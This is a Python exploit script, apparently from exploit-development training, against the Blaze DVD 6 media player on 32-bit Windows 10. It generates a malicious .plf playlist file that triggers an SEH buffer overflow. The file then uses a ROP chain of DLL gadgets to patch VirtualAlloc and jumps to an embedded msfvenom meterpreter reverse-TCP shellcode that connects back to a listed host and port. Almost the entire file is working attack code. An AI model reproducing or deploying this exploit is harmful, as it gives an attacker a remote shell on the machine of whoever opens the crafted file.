# Blaze DVD Version 6
# Tested Windows 10 32 bit
from struct import pack


def main():

    filename = "C:\\Users\\XXXX\\Desktop\\ExpDev_Traning\\blazedummyfile\\blaze-exp.plf"

   
    ConfigurationBaseDll = 0x60300000


    nops = b"\x90" * 0x10

    # Bad Chars -> \x0a\x1a\x2f\x3a\x5c
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.12 LPORT=443 -b "\x00\x0a\x1a\x2f\x3a\x5c" -f py -v shellcode --smallest
    shellcode =  b"\x90\x90\x81\xC4\x3C\xF6\xFF\xFF" # add esp,-2500 // give some space to avoid metastploit shellcode decoder to corrupt itelf."
    shellcode += b"\x6a\x4a\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81"
    shellcode += b"\x73\x13\xd4\x11\x33\xf8\x83\xeb\xfc\xe2\xf4"
    shellcode += b"\x28\xf9\xbc\xf8\xd4\x11\x53\x71\x31\x20\xe1"
    shellcode += b"\x9c\x5f\x43\x03\x73\x86\x1d\xb8\xaa\xc0\x1e"
    shellcode += b"\x84\xb2\xf2\x20\xcc\x73\xa6\x39\x02\x38\x78"
    shellcode += b"\x2d\x52\x84\xd6\x3d\x13\x39\x1b\x1c\x32\x3f"
    shellcode += b"\x9d\x64\xdc\xaa\x5f\x43\x23\x73\x96\x2d\x64"
    shellcode += b"\xf9\x04\x9a\x73\x80\x51\xd1\x47\xb4\xd5\xc1"
    shellcode += b"\xb8\xa0\xf4\x41\xb8\xb0\xcc\x10\xe0\x7d\x1d"
    shellcode += b"\x65\x0f\xc9\x2b\x58\xb8\xcc\x5f\x10\xe5\xc9"
    shellcode += b"\x14\xd0\xfc\xf5\x78\x10\xf4\xc0\x34\x64\xc7"
    shellcode += b"\xfb\xa9\xe9\x08\x85\xf0\x64\xd3\xa0\x5f\x49"
    shellcode += b"\x17\xf9\x07\x77\xb8\xf4\x9f\x9a\x6b\xe4\xd5"
    shellcode += b"\xc2\xb8\xfc\x5f\x10\xe3\x71\x90\x35\x17\xa3"
    shellcode += b"\x8f\x70\x6a\xa2\x85\xee\xd3\xa0\x8b\x4b\xb8"
    shellcode += b"\xea\x3d\x91\xcc\x07\x2b\x4c\x5b\xcb\xe6\x11"
    shellcode += b"\x33\x90\xa3\x62\x01\xa7\x80\x79\x7f\x8f\xf2"
    shellcode += b"\x16\xba\x10\x2b\xc1\x8b\x68\xd5\x11\x33\xd1"
    shellcode += b"\x10\x45\x63\x90\xfd\x91\x58\xf8\x2b\xc4\x59"
    shellcode += b"\xf2\xbc\xd1\x9b\x7c\xd8\x79\x31\xf8\xd5\xaa"
    shellcode += b"\xba\x1e\x84\x41\x63\xa8\x94\x41\x73\xa8\xbc"
    shellcode += b"\xfb\x3c\x27\x34\xee\xe6\x6f\xbe\x01\x65\xaf"
    shellcode += b"\xbc\x88\x96\x8c\xb5\xee\xe6\x7d\x14\x65\x3f"
    shellcode += b"\x07\x9a\x19\x46\x14\xbc\xe1\x86\x5a\x82\xee"
    shellcode += b"\xe6\x92\xd4\x7b\x37\xae\x83\x79\x31\x21\x1c"
    shellcode += b"\x4e\xcc\x2d\x5f\x27\x59\xb8\xbc\x11\x23\xf8"
    shellcode += b"\xd4\x47\x59\xf8\xbc\x49\x97\xab\x31\xee\xe6"
    shellcode += b"\x6b\x87\x7b\x33\xae\x87\x46\x5b\xfa\x0d\xd9"
    shellcode += b"\x6c\x07\x01\x10\xf0\xd1\x12\x64\xdd\x3b"

    shellcode += b"D" * (600 - len(shellcode)) 


    # VA Template
    va = pack("<L",(0x48484848))    # VirtualAlloc
    va += pack("<L",(0x49494949))   # return address -> Shellcode Address
    va += pack("<L",(0x50505050))   # lpAddress -> Shellcode Address
    va += pack("<L",(0x51515151))   # dwSize -> 0x1
    va += pack("<L",(0x52525252))   # flAllocationType -> 0x1000
    va += pack("<L", (0x53535353))  # flProtect -> 0x40

    paddingva = b"A"*0x10

    buf = nops + shellcode + b"A" * (868  - len(va) - len(paddingva) - len(shellcode) - len(nops))  + va + paddingva
    buf += pack("<L",0x42424242) # dummy value  # Next SEH
    buf += pack("<L",ConfigurationBaseDll+0xf1b3) # 0x6030f1b3: add esp, 0x00000948 ; ret ; (1 found) # Handler SEH PowerManagementCtrl.dll


    padding = b"\x90" * 0x40  # 0x6c // 0x54 / 0x74 / 0x78 // 0x44 // 0x58 // 0x60

    # ROP CHAIN
    # Patching VirtualAlloc
    rop = pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x88d31bd0)) # IAT VirtualAlloc -> ? 0x88888888 + 004a9248 // note that original was 1a i changed 1b because 1a is bad character
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888988)) # 0x88888988  for calculation ; note the 9 to avoid the 1a bad character
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x39cda)) # 0x60339cda: mov eax, ecx ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x2b9fa)) # 0x6032b9fa: mov ecx,  [eax] ; mov eax,  [ecx-0x08] ; mov edx,  [ecx-0x04] ; ret ; 
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff64)) # junk for retn esi  # offset for eax (stack) -0x9c
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # Patching Return Address -> Shellcode
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff44)) # junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xffffffff)) # -0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x2cbd0)) # 0x6032cbd0: mov edx, eax ; xor eax, eax ; and cl, 0x1F ; shl edx, cl ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xfffffbfd)) # -0x423 offset for shellcode addr - 0x403
    rop += pack("<L",(ConfigurationBaseDll+0x27438)) #  0x60327438: add ecx, edx ; add eax, ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn esi 
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xffffff04)) # -0xfc junk for retn esi  # offset for eax (stack) -0xfc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
   
    # Patching lpAddress -> Shellcode Address
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x250cb)) # 0x603250cb: inc eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # Patching dwSize -> 0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0xffffffff)) # -0x1
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x3bec2)) # 0x6033bec2: inc ecx ; add al, 0x03 ; ret
    rop += pack("<L",(ConfigurationBaseDll+0x23170)) # 0x60323170: dec eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x23170)) # 0x60323170: dec eax ; ret ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi


    # Patching flAllocationType -> 0x1000
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x88889888)) # 0x1000 -> ? 0x88888888 + 0x1000 // 
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888888)) # 0x88888888  for calculation ; 
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xfffffe90)) # -0x170 junk for retn esi  # offset for eax (stack) -0xbc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi

    # flProtect -> 0x40
    rop += pack("<L",(ConfigurationBaseDll+0x3b578)) ### 0x6033b578: pop ecx ; ret ; (1 found)
    rop += pack("<L", (0x888888c8)) # 0x40 -> ? 0x88888888 + 0x40 // 
    rop += pack("<L",(ConfigurationBaseDll+0x2865a)) ###  0x6032865a: pop eax ; ret ; (1 found)
    rop += pack("<L", (0x88888888)) # 0x88888888  for calculation ; 
    rop += pack("<L",(ConfigurationBaseDll+0x8466)) # 0x60308466: sub ecx, eax ; sub edx, eax ; xor eax, eax ; cmp ecx, edx ; setnle al ; retn 0x0004 ; (1 found)
    rop += pack("<L",(ConfigurationBaseDll+0x3b77b)) #  0x6033b77b: pop edx ; xor al, 0x60 ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x4
    rop += pack("<L",(ConfigurationBaseDll+0x63854)) # Writable address 0x60363854 for the edx below -> 0x603359cb
    rop += pack("<L", (ConfigurationBaseDll+0x1e23b)) ### 0x6031e23b: push esp ; mov eax, edi ; pop edi ; pop esi ; ret ; (1 found
    rop += pack("<L",(0x42424242)) # junk for  esi
    rop += pack("<L", (ConfigurationBaseDll+0x3683b)) # 0x6033683b: mov eax, edi ; pop edi ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x45454545)) # junk for retn edi 
    rop += pack("<L",(0xfffffe4c)) # -0x1b4 junk for retn esi  # offset for eax (stack) -0x1b4
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L",(ConfigurationBaseDll+0x2d8c0))  # 0x6032d8c0: mov  [eax], ecx ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    

    # Align ESP
    rop += pack("<L", (ConfigurationBaseDll+0x1dd4)) # 0x60301dd4: pop esi ; ret ; (1 found) 
    rop += pack("<L",(0xffffffec)) # -0x14 junk for retn esi  # offset for eax (stack) -0xbc
    rop += pack("<L",(ConfigurationBaseDll+0x359cb)) # 0x603359cb: add esi, eax ; inc ebp ; adc byte [edx-0x0A], dh ; ret ; (1 found
    rop += pack("<L",(ConfigurationBaseDll+0x3a170)) # 0x6033a170: mov eax, esi ; pop esi ; ret ; (1 found)
    rop += pack("<L", (0x45454545)) # Junk for esi
    rop += pack("<L", (ConfigurationBaseDll+0x33c42)) # 0x60333c42: xchg eax, esp ; ret ; (1 found)


    buf += padding + rop + b"E" * (0x13e8 - len(buf) - len(padding) - len(rop) )

    with open(filename,'wb') as f:
        f.write(buf)


if __name__ == '__main__':
    main()